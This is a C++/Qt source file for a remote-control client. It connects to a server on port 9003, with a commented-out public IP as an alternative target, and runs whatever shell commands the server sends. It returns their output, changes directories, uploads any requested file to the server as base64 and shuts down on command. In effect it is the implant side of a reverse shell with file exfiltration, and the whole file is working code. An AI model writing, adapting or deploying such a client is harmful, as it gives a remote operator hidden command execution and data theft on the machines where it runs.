#include "client.h"
#include "utility.h"

#include <QString>
#include <QDebug>
#include <QDir>
#include <QDataStream>
#include <QJsonDocument>
#include <QJsonObject>
#include <QJsonParseError>
#include <QByteArray>
#include <QFile>
#include <QCoreApplication>

#include <memory>
//#include <filesystem>
#include <iostream>


Client::Client(QTcpSocket *parent)
    : QTcpSocket(parent)
{
}

void Client::connectToServer()
{
    connect(this, &QTcpSocket::readyRead, this, &Client::messageFromServer);
    //connect(this, &QTcpSocket::connected, this, &Client::clientConnected);

    //this->connectToHost("23.254.225.170", 9003);
    this->connectToHost("localhost", 9003);
}

void Client::cmdReceived(QJsonObject d)
{
    auto program = d.value("program").toString();
    if (program == "cd")
    {
        try
        {
            //std::filesystem::current_path(d.value("args").toString().toStdString());
            util::Utility::setCurrendDir(d.value("args").toString().toStdString());
        }
        catch (util::DirNotFound &err)
        {
            sendResponse(QString::fromStdString(err.what()));
        }
        sendResponse("");
    }
    else if (program == "servcp")
    {
        sendFile(d.value("args").toString());
    }
    else if (program == "closeclient")
    {
        QCoreApplication::exit(0);
    }
    else
    {
        executeCommand(program, d.value("args").toString());
    }

}

void Client::executeCommand(const QString &program, const QString &args)
{

    auto cmd = program + " " + args;
    //std::cout << "Command: " << cmd.toStdString() << std::endl;
    auto result = util::Utility::excuteCommand(cmd.toStdString());
    sendResponse(QString::fromStdString(result));
}

void Client::sendFile(const QString &fileName)
{
    QFile *file = new QFile(fileName);
    //qDebug() << "File: " << file->fileName();
    if (!file->exists())
    {
        sendResponse("File: " + file->fileName() + " doesn't exists!\n");
        return;
    }

    if (file->open(QIODevice::ReadOnly))
    {
        //qDebug() << "Uploading file..." << file->fileName();
        sendResponse("Uploading file...\n");
        QByteArray data = file->readAll();
        //qDebug() << "[OK]File read";
        sendResponse(file->fileName(), data);
    }
}

void Client::sendResponse(const QString &response)
{
    //std::cout << response.toStdString() << std::endl;
    QJsonObject jObj;
    jObj["res"] = response;
    jObj["cwd"] = QString::fromStdString(util::Utility::currentDir());

    QDataStream stream(this);

    //qDebug() << "Sending res: " << response;

    stream << QJsonDocument(jObj).toJson(QJsonDocument::Compact);
}

void Client::sendResponse(const QString &response, const QByteArray &data)
{
    //qDebug() << "Preparing JSON...";
    QString dataBase64;
    try {
        dataBase64 = data.toBase64();
    }  catch (std::bad_alloc &err)
    {
        //std::cout << "Bad alloc error, file too large... " << err.what() << std::endl;
        sendResponse("Bad alloc");
        return;
    }

    QJsonObject jData;
    jData["res"] = "Data received: " + response + "\n";
    jData["cwd"] = QString::fromStdString(util::Utility::currentDir());
    jData["data"] = dataBase64;
    jData["filename"] = response.split("/").last();

   // qDebug() << "Json ready...";

    QDataStream stream(this);
    //qDebug() << "Sending JSON...";
    stream << QJsonDocument(jData).toJson(QJsonDocument::Compact);
}

void Client::messageFromServer()
{
    QDataStream stream(this);
    QByteArray data;

    for(;;)
    {
        stream.startTransaction();

        stream >> data;
        if (stream.commitTransaction())
        {
            QJsonParseError parseError;
            const QJsonDocument jDoc = QJsonDocument::fromJson(data, &parseError);

            if (parseError.error == QJsonParseError::NoError)
            {
                cmdReceived(jDoc.object());
                //qDebug() << "CMD received: " << jDoc.object().value("program");
            }
        }

        else {
            break;
        }
    }
}

